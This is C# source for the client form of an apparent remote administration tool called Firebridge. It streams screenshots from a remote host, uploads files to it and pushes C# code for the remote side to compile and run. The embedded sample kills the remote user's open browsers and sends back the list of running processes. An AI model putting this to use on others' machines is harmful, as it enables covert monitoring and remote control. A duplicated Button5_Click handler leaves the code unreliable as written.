using FirebridgeShared.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using FirebridgeShared.Models;

namespace FirebridgeClient
{
    public partial class Form1 : Form
    {
        Connection c;
        Random r = new Random();
        int num;
        public Form1(string ip)
        {
            num = r.Next();
            InitializeComponent();
            c = new Connection(new IPEndPoint(IPAddress.Parse(ip), 6969));
            c.MessageRecieved += C_MessageRecieved;
            this.timer1.Enabled = true;
            panel1.GetType()
            .GetProperty("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic)
            ?.SetValue(panel1, true);
            this.Text = ip;

        }

        private void DiscoveryClient_ClientResponded(object sender, EventArgs e)
        {

        }

        private void C_MessageRecieved(object sender, EventArgs e)
        {
            var packet = ((MessageEventArgs)e).Packet;
            if (packet.Id == 3)
            {
                panel1.BackgroundImage?.Dispose();
                panel1.BackgroundImage = (Bitmap)packet.Data;
                return;
            }
            Console.WriteLine(((MessageEventArgs)e).Packet.Data.ToString());
            if (this.InvokeRequired)
                this.Invoke(new Action(() => _textBoxConsole.Text += ((MessageEventArgs)e).Packet.Data.ToString() + Environment.NewLine));
            else
                _textBoxConsole.Text += ((MessageEventArgs)e).Packet.Data.ToString() + Environment.NewLine;

        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            c.SendPacket(new Packet() { Id = 3, Data = "" });
            //GC.Collect();
        }

        private void _buttonConsoleSubmit_Click(object sender, EventArgs e)
        {
            c.SendPacket(new Packet() { Id = 0, Data = _textBoxSubmitText.Text + num + r.Next(500).ToString() });
        }

        private void _textBoxConsole_TextChanged(object sender, EventArgs e)
        {
            _textBoxConsole.SelectionStart = _textBoxConsole.Text.Length;
            _textBoxConsole.ScrollToCaret();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            var f = new OpenFileDialog();
            if (f.ShowDialog() == DialogResult.OK)
            {
                c.SendPacket(new Packet() { Id = 4, Data = File.ReadAllBytes(f.FileName) });
            }

        }

        private void Button1_Click(object sender, EventArgs e)
        {
            c.SendPacket(new Packet() { Id = 2, Data = 70 });
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            c.SendPacket(new Packet() { Id = 2, Data = 71 });

        }

        private void Button4_Click(object sender, EventArgs e)
        {

            c.SendPacket(new Packet() { Id = 50, Data = 71 });
        }

        private void Button5_Click(object sender, EventArgs e)
        {
            c.SendPacket(new Packet() { Id = 5 });
        }

        private void Button6_Click(object sender, EventArgs e)
        {
            c.SendPacket(new Packet()
            {
                Id = 1,
                Data = new MiniProgramModel()
                {
                    Code = @"
using System;
using System.Diagnostics;
using System.Linq;
using FirebridgeShared.Networking;

namespace TestApp
{
    public static class Program
    {
        public static void Main(Connection s)
        {
            Process[] AllProcesses = Process.GetProcesses();
            foreach (var process in AllProcesses)
            {
                if (process.MainWindowTitle != """")
                {
                    string k = process.ProcessName.ToLower();
                    if (k == ""iexplore"" || k == ""iexplorer"" || k == ""chrome"" || k == ""firefox"")
                        process.Kill();
                }
            }
            
           s.SendPacket(new Packet() { Id = 0, Data = String.Join("","", Process.GetProcesses().Select(p => p.ProcessName.ToString()).ToArray())});

                }
    }
}",
                    EntryPoint = "TestApp.Program",
                    References = new List<string>()
                    {
                        "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll"
                    },
                }
            });
        }

        private void Button5_Click(object sender, EventArgs e)
        {
            var f = new OpenFileDialog();
            if (f.ShowDialog() == DialogResult.OK)
            {
                c.SendPacket(new Packet() { Id = 6, Data = File.ReadAllBytes(f.FileName) });
            }
        }
    }
}
